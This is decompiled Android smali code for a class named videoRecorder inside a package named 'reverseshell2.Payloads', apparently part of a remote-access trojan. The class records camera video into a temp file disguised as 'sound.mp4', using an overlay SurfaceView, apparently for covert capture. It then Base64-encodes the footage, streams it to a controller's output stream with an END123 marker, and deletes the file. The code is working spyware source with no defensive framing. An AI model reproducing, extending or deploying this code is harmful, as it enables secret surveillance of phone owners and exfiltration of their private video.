.class public Lcom/example/reverseshell2/Payloads/videoRecorder;
.super Ljava/lang/Object;
.source "videoRecorder.java"


# static fields
.field static TAG:Ljava/lang/String;

.field static outputStream:Ljava/io/OutputStream;


# instance fields
.field activity:Landroid/app/Activity;

.field private camera:Landroid/hardware/Camera;

.field context:Landroid/content/Context;

.field private mediaRecorder:Landroid/media/MediaRecorder;

.field private surfaceView:Landroid/view/SurfaceView;

.field videoFile:Ljava/io/File;

.field private windowManager:Landroid/view/WindowManager;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 33
    const-string v0, "videoRecoderClass"

    sput-object v0, Lcom/example/reverseshell2/Payloads/videoRecorder;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Landroid/app/Activity;)V
    .locals 1
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "activity"    # Landroid/app/Activity;

    .line 38
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 31
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->camera:Landroid/hardware/Camera;

    .line 32
    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    .line 39
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->context:Landroid/content/Context;

    .line 40
    iput-object p2, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->activity:Landroid/app/Activity;

    .line 41
    return-void
.end method

.method static synthetic access$000(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/view/WindowManager;
    .locals 1
    .param p0, "x0"    # Lcom/example/reverseshell2/Payloads/videoRecorder;

    .line 25
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->windowManager:Landroid/view/WindowManager;

    return-object v0
.end method

.method static synthetic access$002(Lcom/example/reverseshell2/Payloads/videoRecorder;Landroid/view/WindowManager;)Landroid/view/WindowManager;
    .locals 0
    .param p0, "x0"    # Lcom/example/reverseshell2/Payloads/videoRecorder;
    .param p1, "x1"    # Landroid/view/WindowManager;

    .line 25
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->windowManager:Landroid/view/WindowManager;

    return-object p1
.end method

.method static synthetic access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/view/SurfaceView;
    .locals 1
    .param p0, "x0"    # Lcom/example/reverseshell2/Payloads/videoRecorder;

    .line 25
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->surfaceView:Landroid/view/SurfaceView;

    return-object v0
.end method

.method static synthetic access$102(Lcom/example/reverseshell2/Payloads/videoRecorder;Landroid/view/SurfaceView;)Landroid/view/SurfaceView;
    .locals 0
    .param p0, "x0"    # Lcom/example/reverseshell2/Payloads/videoRecorder;
    .param p1, "x1"    # Landroid/view/SurfaceView;

    .line 25
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->surfaceView:Landroid/view/SurfaceView;

    return-object p1
.end method

.method static synthetic access$200(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/hardware/Camera;
    .locals 1
    .param p0, "x0"    # Lcom/example/reverseshell2/Payloads/videoRecorder;

    .line 25
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->camera:Landroid/hardware/Camera;

    return-object v0
.end method

.method static synthetic access$202(Lcom/example/reverseshell2/Payloads/videoRecorder;Landroid/hardware/Camera;)Landroid/hardware/Camera;
    .locals 0
    .param p0, "x0"    # Lcom/example/reverseshell2/Payloads/videoRecorder;
    .param p1, "x1"    # Landroid/hardware/Camera;

    .line 25
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->camera:Landroid/hardware/Camera;

    return-object p1
.end method

.method static synthetic access$300(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;
    .locals 1
    .param p0, "x0"    # Lcom/example/reverseshell2/Payloads/videoRecorder;

    .line 25
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    return-object v0
.end method

.method static synthetic access$302(Lcom/example/reverseshell2/Payloads/videoRecorder;Landroid/media/MediaRecorder;)Landroid/media/MediaRecorder;
    .locals 0
    .param p0, "x0"    # Lcom/example/reverseshell2/Payloads/videoRecorder;
    .param p1, "x1"    # Landroid/media/MediaRecorder;

    .line 25
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    return-object p1
.end method

.method private static sendData(Ljava/io/File;)V
    .locals 6
    .param p0, "file"    # Ljava/io/File;

    .line 215
    invoke-virtual {p0}, Ljava/io/File;->length()J

    move-result-wide v0

    const-wide/32 v2, 0xf42400

    cmp-long v4, v0, v2

    if-lez v4, :cond_0

    .line 216
    sget-object v0, Lcom/example/reverseshell2/Payloads/videoRecorder;->TAG:Ljava/lang/String;

    const-string v1, "Scamm"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 218
    :try_start_0
    sget-object v0, Lcom/example/reverseshell2/Payloads/videoRecorder;->outputStream:Ljava/io/OutputStream;

    const-string v1, "Large file cant transfer\nEND123\n"

    const-string v2, "UTF-8"

    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 221
    goto :goto_0

    .line 219
    :catch_0
    move-exception v0

    .line 220
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 222
    .end local v0    # "e":Ljava/io/IOException;
    :goto_0
    return-void

    .line 224
    :cond_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/example/reverseshell2/Payloads/videoRecorder$5;

    invoke-direct {v1}, Lcom/example/reverseshell2/Payloads/videoRecorder$5;-><init>()V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 233
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 234
    invoke-virtual {p0}, Ljava/io/File;->length()J

    move-result-wide v0

    long-to-int v1, v0

    .line 235
    .local v1, "size":I
    new-array v0, v1, [B

    .line 237
    .local v0, "data":[B
    :try_start_1
    new-instance v2, Ljava/io/BufferedInputStream;

    new-instance v3, Ljava/io/FileInputStream;

    invoke-direct {v3, p0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    .line 238
    .local v2, "buf":Ljava/io/BufferedInputStream;
    array-length v3, v0

    const/4 v4, 0x0

    invoke-virtual {v2, v0, v4, v3}, Ljava/io/BufferedInputStream;->read([BII)I

    .line 239
    sget-object v3, Lcom/example/reverseshell2/Payloads/videoRecorder;->TAG:Ljava/lang/String;

    invoke-static {v1}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-static {v3, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 240
    invoke-static {v0, v4}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v3

    .line 241
    .local v3, "encodedVideo":Ljava/lang/String;
    new-instance v4, Ljava/lang/Thread;

    new-instance v5, Lcom/example/reverseshell2/Payloads/videoRecorder$6;

    invoke-direct {v5, v3}, Lcom/example/reverseshell2/Payloads/videoRecorder$6;-><init>(Ljava/lang/String;)V

    invoke-direct {v4, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 251
    invoke-virtual {v4}, Ljava/lang/Thread;->start()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 253
    .end local v2    # "buf":Ljava/io/BufferedInputStream;
    .end local v3    # "encodedVideo":Ljava/lang/String;
    goto :goto_1

    .line 252
    :catch_1
    move-exception v2

    .line 254
    :goto_1
    return-void
.end method


# virtual methods
.method public startVideo(ILjava/io/OutputStream;)V
    .locals 3
    .param p1, "cameraID"    # I
    .param p2, "outputStream"    # Ljava/io/OutputStream;

    .line 44
    sput-object p2, Lcom/example/reverseshell2/Payloads/videoRecorder;->outputStream:Ljava/io/OutputStream;

    .line 45
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v0

    .line 47
    .local v0, "outputDir":Ljava/io/File;
    :try_start_0
    const-string v1, "sound"

    const-string v2, ".mp4"

    invoke-static {v1, v2, v0}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v1

    iput-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 50
    goto :goto_0

    .line 48
    :catch_0
    move-exception v1

    .line 49
    .local v1, "e":Ljava/io/IOException;
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    .line 52
    .end local v1    # "e":Ljava/io/IOException;
    :goto_0
    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->activity:Landroid/app/Activity;

    new-instance v2, Lcom/example/reverseshell2/Payloads/videoRecorder$1;

    invoke-direct {v2, p0, p1, p2}, Lcom/example/reverseshell2/Payloads/videoRecorder$1;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder;ILjava/io/OutputStream;)V

    invoke-virtual {v1, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 148
    return-void
.end method

.method public videoStop(Ljava/io/OutputStream;)V
    .locals 5
    .param p1, "outputStream"    # Ljava/io/OutputStream;

    .line 152
    sput-object p1, Lcom/example/reverseshell2/Payloads/videoRecorder;->outputStream:Ljava/io/OutputStream;

    .line 153
    sget-object v0, Lcom/example/reverseshell2/Payloads/videoRecorder;->TAG:Ljava/lang/String;

    const-string v1, "camera stop called"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 154
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    if-eqz v0, :cond_1

    .line 156
    :try_start_0
    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V
    :try_end_0
    .catch Ljava/lang/IllegalStateException; {:try_start_0 .. :try_end_0} :catch_0

    .line 169
    goto :goto_0

    .line 157
    :catch_0
    move-exception v0

    .line 158
    .local v0, "e":Ljava/lang/IllegalStateException;
    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/example/reverseshell2/Payloads/videoRecorder$2;

    invoke-direct {v2, p0, p1}, Lcom/example/reverseshell2/Payloads/videoRecorder$2;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder;Ljava/io/OutputStream;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 168
    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 170
    .end local v0    # "e":Ljava/lang/IllegalStateException;
    :goto_0
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->reset()V

    .line 171
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    .line 172
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->lock()V

    .line 173
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    .line 174
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->windowManager:Landroid/view/WindowManager;

    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->surfaceView:Landroid/view/SurfaceView;

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    .line 176
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v0

    const-wide/16 v2, 0x0

    cmp-long v4, v0, v2

    if-eqz v4, :cond_0

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 177
    sget-object v0, Lcom/example/reverseshell2/Payloads/videoRecorder;->TAG:Ljava/lang/String;

    const-string v1, "file exists"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 178
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;

    invoke-static {v0}, Lcom/example/reverseshell2/Payloads/videoRecorder;->sendData(Ljava/io/File;)V

    goto :goto_1

    .line 180
    :cond_0
    sget-object v0, Lcom/example/reverseshell2/Payloads/videoRecorder;->TAG:Ljava/lang/String;

    const-string v1, "no error for getting audio"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 181
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/example/reverseshell2/Payloads/videoRecorder$3;

    invoke-direct {v1, p0, p1}, Lcom/example/reverseshell2/Payloads/videoRecorder$3;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder;Ljava/io/OutputStream;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 196
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 198
    :goto_1
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    goto :goto_2

    .line 200
    :cond_1
    sget-object v0, Lcom/example/reverseshell2/Payloads/videoRecorder;->TAG:Ljava/lang/String;

    const-string v1, "no error for gq2123123123"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 201
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/example/reverseshell2/Payloads/videoRecorder$4;

    invoke-direct {v1, p0, p1}, Lcom/example/reverseshell2/Payloads/videoRecorder$4;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder;Ljava/io/OutputStream;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 210
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 212
    :goto_2
    return-void
.end method
